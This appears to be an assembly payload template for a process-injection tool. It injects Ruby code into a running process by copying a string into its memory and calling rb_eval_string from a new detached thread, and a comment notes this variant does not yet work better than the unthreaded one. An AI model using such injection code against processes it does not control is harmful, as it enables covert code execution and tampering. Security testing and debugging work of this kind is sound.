// an attempt to work around Ruby locking up when code is injected
// does not currently work any better than the unthreaded version

[FRAGMENT:asminject_copy_bytes.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_create.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_detach.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_exit.s:FRAGMENT]
[FRAGMENT:asminject_nanosleep.s:FRAGMENT]
	
	// copy the Ruby string to arbitrary read/write memory
	push r14
	mov rdi, arbitrary_read_write_data_address[rip]
	add rdi, 32
	lea rsi, ruby_code[rip]
	mov rcx, [VARIABLE:rubycode.length:VARIABLE]
	add rcx, 2												# null terminator
	call asminject_copy_bytes
	pop r14
	// END: copy the Ruby string to arbitrary read/write memory
	
	// BEGIN: call rb_eval_string
	push r14
	push rbx
	mov rdi, arbitrary_read_write_data_address[rip]
	add rdi, 32
	mov rbx, [FUNCTION_ADDRESS:^rb_eval_string$:IN_BINARY:.+/libruby[0-9\.so\-]+$:FUNCTION_ADDRESS]
	call rbx
	pop rbx
	pop r14
	// END: call rb_eval_string
	
	ret
	
forever_loop:
	mov rdi, 10
	mov rsi, 10
	call asminject_nanosleep
	jmp forever_loop

execute_ruby_code_main:
	lea rdx, execute_ruby_code_inner[rip]
	mov rdi, arbitrary_read_write_data_address[rip]
	add rdi, 0x1000		# don't overwrite anything important
	push rdx
	push rdi
	call asminject_libpthread_pthread_create
	pop rdi
	pop rdx
// detach the newly-created thread where the library has been loaded
	call asminject_libpthread_pthread_detach

SHELLCODE_SECTION_DELIMITER

ruby_code:
	.ascii "[VARIABLE:rubycode:VARIABLE]\0"

#ruby_argv:
#	.ascii "\0"
	
#ruby_argc:
#	.byte 1

